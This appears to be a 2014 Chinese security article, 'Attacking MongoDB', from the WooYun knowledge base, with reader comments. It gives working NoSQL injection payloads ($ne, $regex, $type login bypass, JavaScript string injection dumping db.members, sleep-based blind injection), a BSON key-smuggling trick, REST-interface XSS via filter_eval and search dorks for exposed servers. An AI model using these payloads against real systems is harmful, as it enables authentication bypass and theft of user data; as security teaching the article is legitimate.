@@ -1,0 +1,71 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Attacking MongoDB</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2014/01/10 17:14" ui-time="" datetime="2014/01/10 17:14" class="published ng-binding ng-isolate-scope">2014/01/10 17:14</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>本文主要来自于HITB Ezine Issue 010中的《Attacking MongoDB》</p><p>MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。他支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是他支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</p><p>开发人员使用NoSQL数据库的各种应用越来越多。 针对NoSQL的攻击方法是知之甚少，并不太常见。与SQL注入比较，本文重点介绍通过MongoDB的漏洞对Web应用程序可能的攻击。</p><h2>0x01 攻击</h2><hr><h3>1)REST接口</h3><p>关注到有一个REST接口，提供一个web界面访问，默认运行在28017端口上，管理员可以用浏览器远程控制数据库，这个接口我发现了两个存储型xss以及很多的CSRF。</p><p>寻找方式：</p><p>http://www.shodanhq.com/search?q=port%3A28017</p><p><img alt="enter image description here" img-src="1c1501a584f84e2108e9f0ca75d71df56c014d4f.jpg"></p><p>google搜索：</p><pre><code>intitle:mongo intext:"listDatabases"
+</code></pre><p><img alt="enter image description here" img-src="953d64d3ca6147b6b1e859a8f022c25f640a82cc.jpg"></p><p>下了最新版本的mongodb默认不是启用rest的，需要在配置文件（/etc/mongod.conf）中加入一行</p><pre><code>rest = true
+</code></pre><p>才可以打开其他链接内容。</p><p>下图展示了攻击方法</p><p>插入js代码，让管理员执行，利用REST接口，执行mongodb的命令，结果返回到攻击者的服务器上。</p><p><img alt="enter image description here" img-src="76f757eb5a1958009d9289c4df88dc0bceb28917.jpg"></p><p>例如，我利用js代码让管理员访问http://xxx.com:28017/admin/$cmd/?filter_eval=function()%7B%20return%20db.version()%20%7D&amp;limit=1</p><p>返回结果：</p><p><img alt="enter image description here" img-src="a37793600347820faee86128a53d3d709dd76f36.jpg"></p><h3>2)Apache+PHP+MongoDB</h3><p>一段php操作MongoDB的代码：</p><pre><code>#!php
+$q = array("name" =&gt; $_GET['login'], "password" =&gt; $_ GET['password']);
+$cursor = $collection-&gt;findOne($q);
+</code></pre><p>这个脚本的是向MongoDB数据库请求，如果正常的话，会返回用户的数据：</p><pre><code>#!php
+echo 'Name: ' . $cursor['name'];
+echo 'Password: ' . $cursor['password']; 
+</code></pre><p>访问下面的连接</p><pre><code>?login=admin&amp;password=pa77w0rd 
+</code></pre><p>数据库里的执行情况是：</p><pre><code>db.items.findOne({"name" :"admin", "password" : "pa77w0rd"}) 
+</code></pre><p>如果数据库里存在的该用户名及密码则返回true，否则返回fales。</p><p>下面的数据库语句，返回的为用户不是admin的数据（$ne代表不等于）：</p><pre><code>db.items.find({"name" :{$ne : "admin"}}) 
+</code></pre><p>那么在现实中的数据库操作例子通常是这样子的：</p><pre><code>db.items.findOne({"name" :"admin", "password" : {$ne : "1"}}) 
+</code></pre><p>返回结果将是：</p><pre><code>{
+    "_id" : ObjectId("4fda5559e5afdc4e22000000"),
+    "name" : "admin",
+    "password" : "pa77w0rd"
+}
+</code></pre><p>php传入的方式为：</p><pre><code>#!php
+$q = array("name" =&gt; "admin", "password" =&gt; array("\$ne" =&gt; "1"));
+</code></pre><p>外界请求的参数应该为：</p><pre><code>?login=admin&amp;password[$ne]=1   
+</code></pre><p>当使用正则$regex的时候，执行下列数据库语句，将会返回name中所有已y开头的数据</p><pre><code>db.items.find({name: {$regex: "^y"}})  
+</code></pre><p>如果请求数据的脚本换为：</p><pre><code>#!php
+$cursor1 = $collection-&gt;find(array("login" =&gt; $user, "pass" =&gt; $pass));
+</code></pre><p>返回结果的数据为：</p><pre><code>#!php
+echo 'id: '. $obj2['id'] .'&lt;br&gt;login: '. $obj2['login'] .'&lt;br&gt;pass: '. $obj2['pass'] . '&lt;br&gt;'; 
+</code></pre><p>如果想要返回所有数据的话，可以访问下面的url：</p><pre><code>?login[$regex]=^&amp;password[$regex]=^ 
+</code></pre><p>返回结果将会是：</p><pre><code>id: 1
+login: Admin
+pass: parol
+id: 4
+login: user2
+pass: godloveman
+id: 5
+login: user3
+pass: thepolice=
+</code></pre><p>还有一种利用$type的方式：</p><pre><code>?login[$not][$type]=1&amp;password[$not][$type]=1 
+</code></pre><p>官方这里有详细介绍$type的各个值代表的意思：</p><p><a href="http://cn.docs.mongodb.org/manual/reference/operator/query/type/">http://cn.docs.mongodb.org/manual/reference/operator/query/type/</a></p><p>上面语句表示获取login与password不为双精度类型的，同样会返回所有的数据。</p><h3>3)INJECTION MongoDB</h3><p>当执行的语句采用字符串拼接的时候，同样也存在注入的问题，如下代码：</p><pre><code>#!php
+$q = "function() { var loginn = '$login'; var passs = '$pass'; db.members.insert({id : 2, login : loginn, pass : passs}); }";
+</code></pre><p>当$login与$pass是直接从外界提交到参数获取：</p><pre><code>$login = $_GET['login'];
+$pass = $_GET['password'];
+</code></pre><p>并且没有任何过滤，直接带入查询：</p><pre><code>#!php
+$db-&gt;execute($q);
+$cursor1 = $collection-&gt;find(array("id" =&gt; 2));
+foreach($cursor1 as $obj2){
+echo "Your login:".$obj2['login'];
+echo "&lt;br&gt;Your password:".$obj2['pass'];
+} 
+</code></pre><p>输入测试数据：</p><pre><code>?login=user&amp;password=password
+</code></pre><p>返回结果将是：</p><pre><code>Your login: user
+Your password: password  
+</code></pre><p>输入</p><pre><code>?login=user&amp;password=';
+</code></pre><p>页面将会返回报错。</p><p>输入</p><pre><code>/?login=user&amp;password=1'; var a = '1 
+</code></pre><p>页面返回正常，如何注入出数据呢：</p><pre><code>?login=user&amp;password=1'; var loginn = db.version(); var b='
+</code></pre><p>看一下返回结果：</p><p><img alt="enter image description here" img-src="9b1a92b443f6d651b166bb0703fe8700820dbcf9.jpg"></p><p>带入实际中$q是变为：</p><pre><code>#!php
+$q = "function() { var loginn = user; var passs = '1'; var loginn = db.version(); var b=''; db.members.insert({id : 2, login : loginn, pass : passs}); }"
+</code></pre><p>获取其他数据的方法：</p><pre><code> /?login=user&amp;password= '; var loginn = tojson(db.members.find()[0]); var b='2
+</code></pre><p>给loginn重新赋值，覆盖原来的user内容，tojson函数帮助获取到完整的数据信息，否则的话将会接收到一个Array。</p><p>最重要的部分是db.memeber.find()[0]，member是一个表，find函数是获取到所有内容，[0]表示获取第一个数组内，可以递增获取所有的内容。</p><p>当然也有可能遇到没有返回结果的时候，经典的时间延迟注入也可以使用：</p><pre><code>?login=user&amp;password='; if (db.version() &gt; "2") { sleep(10000); exit; } var loginn =1; var b='2 
+</code></pre><h3>4)BSON</h3><p>BSON（Binary Serialized Document Format）是一种类json的一种二进制形式的存储格式，简称Binary JSON，它和JSON一样，支持内嵌的文档对象和数组对象，但是BSON有JSON没有的一些数据类型，如Date和BinData类型。</p><p>默认test表中有两条数据：</p><pre><code>&gt; db.test.find({}) 
+{ "_id" : ObjectId("52cfa5c9e085a58263f183f9"), "name" : "admin", "isadmin" : true }
+{ "_id" : ObjectId("52cfa5e4e085a58263f183fa"), "name" : "noadmin", "isadmin" : false } 
+</code></pre><p>再插入一条：</p><pre><code>&gt; db.test.insert({ "name" : "noadmin2", "isadmin" : false}) 
+</code></pre><p>然后查询看结果：</p><pre><code>&gt; db.test.find({})
+{ "_id" : ObjectId("52cfa5c9e085a58263f183f9"), "name" : "admin", "isadmin" : true }
+{ "_id" : ObjectId("52cfa5e4e085a58263f183fa"), "name" : "noadmin", "isadmin" : false }
+{ "_id" : ObjectId("52cfa92ce085a58263f183fb"), "name" : "noadmin2", "isadmin" : false } 
+</code></pre><p>再插入一条列名为BSON对象的数据：</p><pre><code>db.test.insert({ "name\x16\x00\x08isadmin\x00\x01\x00\x00\x00\x00\x00" : "noadmin2", "isadmin" : false})
+</code></pre><p>isadmin之前的0x08是指该数据类型是布尔型，后面的0x01是把这个值设定为1。</p><p>这时再查询就回发现isadmin变为的true：</p><pre><code>&gt; db.test.find({})
+{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "admin", "isadmin" : true }
+{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "noadmin", "isadmin" : false }
+{ "_id" : ObjectId("5044ebf6a91b02e9a9b065e3"), "name" : null, "isadmin" : true, "isadmin" : true } 
+</code></pre><p>不过测试最新版的mongodb中，禁止了空字符。</p><p><img alt="enter image description here" img-src="50bf02d94c1998c773b5632308b57a500a63ca03.jpg"></p><p>当然了 我也觉得此类攻击有点YY。。。</p><h2>0x02 总结</h2><hr><p>本文列举了四种攻击mongodb的方式。</p><p>当然这并不是安全否认mongodb的安全性，只是构造了集中可能存在攻击的场景。</p><p>希望大家看到后能够自查一下，以免受到攻击。</p><p>还有一些wofeiwo在2011年的时候就已经写过：</p><p><a href="http://www.phpweblog.net/GaRY/archive/2011/08/18/Mongodb_secuirty_anaylze.html">Mongodb安全性初探</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">aptvxo</span> <span class="reply-time">2015-06-05 19:30:47</span></div><p></p><p>@齐迹 大坑 mysql 毫毛级别</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">chock</span> <span class="reply-time">2014-07-05 16:18:25</span></div><p></p><p>mongo是个坑<br>话说我折腾很久，后来直接iptables，霸气牛逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-04-23 10:56:32</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ricter</span> <span class="reply-time">2014-02-14 23:45:05</span></div><p></p><p>最近在用Mongodb写blog，学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2014-01-15 16:28:07</span></div><p></p><p>服务器内存32G mongodb暂用在6G左右。而且链接非常少。（版本是2.2.5）至于连接池 。求相关介绍！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2014-01-13 15:19:58</span></div><p></p><p>mongodb 非常依赖内存，提升内存是最好的方法。<br>还有就是利用连接池</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2014-01-13 13:27:30</span></div><p></p><p>才5000W数据 2个索引后 不管是查询还是写入都很慢（秒级）！怎么破？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2014-01-13 09:38:16</span></div><p></p><p>支持! mongodb 以2.4.2 为分水岭，不仅性能上，安全上也进行了提升</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mango</span> <span class="reply-time">2014-01-11 18:28:14</span></div><p></p><p>我会说Dz也存在上述漏洞么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2014-01-10 17:30:28</span></div><p></p><p>沙画~<br>Mongodb的文章比较少，多谢lz</p><p></p></div></div></div></div></div></main>
